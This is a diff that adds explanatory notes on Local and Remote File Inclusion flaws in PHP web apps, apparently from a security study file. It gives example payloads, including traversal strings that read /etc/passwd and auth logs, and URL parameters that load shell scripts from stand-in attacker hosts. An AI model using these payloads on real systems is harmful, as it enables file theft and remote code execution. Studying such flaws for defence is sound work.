@@ -68,3 +68,34 @@ Example:
 bash
 Copy code
 GET /load_plugin.php?plugin=../../../../plugin/malicious.php
+
+
+
+# Local File Inclusion (LFI):
+Dynamic Template Inclusion:
+
+Scenario: A PHP application dynamically includes page templates based on a URL parameter, e.g., https://example.com/?page=home.
+Misconfiguration: The application directly includes the parameter value without validation, enabling inclusion of arbitrary files from the server, e.g., page=../../etc/passwd.
+Language Selection:
+
+Scenario: A web app includes localization files based on user-selected languages, e.g., https://example.com/?lang=en.
+Misconfiguration: Lack of input validation allows attackers to load sensitive files by injecting directory traversal payloads, e.g., lang=../../../../var/log/auth.log.
+Profile Picture Inclusion:
+
+Scenario: The app allows users to upload profile pictures and later includes them for rendering on user profiles.
+Misconfiguration: An attacker uploads a malicious file and references it via an LFI vulnerability, e.g., https://example.com/profile?pic=../../uploads/malicious.php.
+
+
+# Remote File Inclusion (RFI):
+Dynamic Script Inclusion:
+
+Scenario: A PHP application includes scripts dynamically based on user input, e.g., https://example.com/?module=home.
+Misconfiguration: Input is not sanitized, allowing attackers to include external scripts, e.g., module=http://malicious.com/shell.php.
+Theme Selection:
+
+Scenario: A CMS allows users to customize themes by loading styles or templates via a URL parameter, e.g., https://example.com/?theme=default.
+Misconfiguration: The parameter accepts external URLs, allowing attackers to include malicious remote files, e.g., theme=http://attacker.com/malicious-theme.php.
+Configuration Import:
+
+Scenario: An application imports configuration files from a URL provided by the user, e.g., https://example.com/import-config?url=config.xml.
+Misconfiguration: The system allows importing remote files without verification, enabling attackers to host malicious configurations or scripts.
